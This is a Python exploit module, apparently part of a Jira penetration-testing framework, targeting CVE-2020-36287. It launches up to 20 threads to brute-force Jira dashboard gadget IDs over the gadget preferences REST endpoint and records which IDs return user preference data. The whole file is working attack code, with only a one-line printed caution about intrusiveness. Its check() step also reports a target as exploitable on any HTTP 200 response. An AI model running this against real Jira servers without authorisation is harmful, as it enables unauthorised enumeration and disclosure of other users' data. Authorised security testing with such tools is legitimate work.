#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import time
from typing import List
from jiraffe.exploits.base import Exploit
from jiraffe.enums import Severity


class CVE202036287(Exploit):
    cve = "CVE-2020-36287"
    severity = Severity.LOW
    description = "Gadget prefs brute-force (rest/dashboards/1.0/10000/gadget/{id}/prefs)"

    def __init__(
        self,
        client,
        target,
        verbose=False,
        check_only=False,
        start: int = 10000,
        end: int = 10500,
        threads: int = 20,
        timeout: float = 5.0,
    ):
        super().__init__(client, target, verbose, check_only)
        self.start = int(start)
        self.end = int(end)
        self.threads = int(threads)
        self.timeout = float(timeout)
        self.matches: List[int] = []
        self._lock = threading.Lock()

    def _check_id(self, gid: int) -> None:
        url = f"{self.target}/rest/dashboards/1.0/10000/gadget/{gid}/prefs"
        try:
            r = self.client.get(url, timeout=self.timeout)
            if r.status_code == 200 and "userPrefsRepresentation" in r.text:
                with self._lock:
                    self.matches.append(gid)
                if self.verbose:
                    print(f"[+] found gadget prefs: {gid}")
        except Exception:
            # network / timeout; ignore for bruteforce
            if self.verbose:
                print(f"[DEBUG] gadget {gid} request failed")

    def check(self) -> bool:
        # lightweight probe: sample a tiny subrange to see if endpoint responds
        sample_start = max(self.start, 10000)
        sample_end = min(self.start + 20, self.end)
        for gid in range(sample_start, sample_end):
            try:
                r = self.client.get(f"{self.target}/rest/dashboards/1.0/10000/gadget/{gid}/prefs", timeout=3)
                if r.status_code == 200 and "userPrefsRepresentation" in r.text:
                    # vulnerable-ish, allow full exploit to run
                    if self.verbose:
                        print(f"[DEBUG] sample gadget {gid} looks accessible")
                    return True
            except Exception:
                continue
        # if none found in sample, still return True if endpoint exists (200) for any sample.
        for gid in range(sample_start, sample_start + 3):
            try:
                r = self.client.get(f"{self.target}/rest/dashboards/1.0/10000/gadget/{gid}/prefs", timeout=2)
                if r.status_code == 200:
                    return True
            except Exception:
                continue
        return False

    def exploit(self) -> None:
        print("[*] Starting gadget prefs brute-force. This is intrusive; respect target rules.")
        # thread pool
        threads = []
        ids = list(range(self.start, self.end))
        # chunk by threads: start threads that each pop ids until exhausted
        id_iter = iter(ids)

        def worker():
            while True:
                try:
                    gid = next(id_iter)
                except StopIteration:
                    break
                self._check_id(gid)

        # launch
        for _ in range(min(self.threads, max(1, len(ids)))):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        # wait
        for t in threads:
            t.join()

        # results
        if self.matches:
            print(f"[+] Found gadget prefs at IDs: {sorted(self.matches)}")
        else:
            print("[-] No gadget prefs found in the scanned range")
